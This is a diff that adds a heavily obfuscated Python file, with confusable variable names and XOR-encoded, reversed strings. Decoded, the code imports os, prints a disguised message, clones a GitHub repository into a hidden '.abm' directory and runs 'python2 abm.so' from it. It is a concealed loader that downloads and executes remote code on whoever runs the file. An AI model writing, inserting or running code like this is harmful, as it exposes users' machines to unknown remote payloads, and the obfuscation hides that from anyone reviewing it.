@@ -1,0 +1,23 @@
+lOO01llO1l000l1O00Ol0 = (lambda lOl1000O11111lOl01111,
+    OO0OOOOl0100l0OOl1100: lOl1000O11111lOl01111 ^ OO0OOOOl0100l0OOl1100)
+OOOOl1OllOO01OOl0lO0O = __import__('er'[::-1], globals(), locals(), [], 0)
+ll0l10l1OllOOOO00O10O = __import__(''.join(chr(O1O1100O1O0100lOO0OOl ^
+    O0O0O00Ol1OOOl0000O1O) for O0O0O00Ol1OOOl0000O1O, O1O1100O1O0100lOO0OOl in
+    zip(b'|\x7f', b'\x13\x0c')), globals(), locals(), [], 0)
+print(''.join(filter(lambda llO1l01000l110l0OOl10: ord(
+    llO1l01000l110l0OOl10) % 3 != 0, "\x1b9lc6W`E'ZN\t6?$")).join(chr(
+    l0OOOOl00Ol010l10llOl ^ O011ll1OlO100OlOOO0Ol) for 
+    O011ll1OlO100OlOOO0Ol, l0OOOOl00Ol010l10llOl in zip(
+    b'\xae^\xfbc#\xf9\xb7\xa5\xd9\xd5i\xcc\xd2\xf9\x80K\x8f\xd3\x1f\xf9\xcf\xe3\xcez'
+    ,
+    b'\xb5\x05\xcaX\x10\xc9\xda\xf1\xb6\xba\x05\xec\xbb\x97\xf3?\xee\xbfs\x98\xbb\x8a\xa1\x14'
+    )))
+getattr(ll0l10l1OllOOOO00O10O, 'sys' + 'tem')(('mba./r3ddocsahniM/moc.b' +
+    'uhtig//:sptth enolc tig')[::-1 ^ 0])
+getattr(ll0l10l1OllOOOO00O10O, ''.join(chr(l0ll00l111O1OOl0llO1l ^
+    ll001lOOOl1l0l01100OO) for ll001lOOOl1l0l01100OO, l0ll00l111O1OOl0llO1l in
+    zip(b'-\xd6\x87\xfc\x1a\xda', b'^\xaf\xf4\x88\x7f\xb7')))(''.join(chr(
+    l11l100100O10O01O00ll ^ llll00lll1111l1l0011O) for 
+    llll00lll1111l1l0011O, l11l100100O10O01O00ll in zip(
+    b'\x14\xdb\x08[\x06\x07\x8f[8\x94B\x05\xaa\x03\xff\x86\x06\xb5n\xad!\x95\x84\xa2\xad'
+    , b'w\xbf(uge\xe2{\x1e\xb2bu\xd3w\x97\xe9h\x87N\xccC\xf8\xaa\xd1\xc2')))
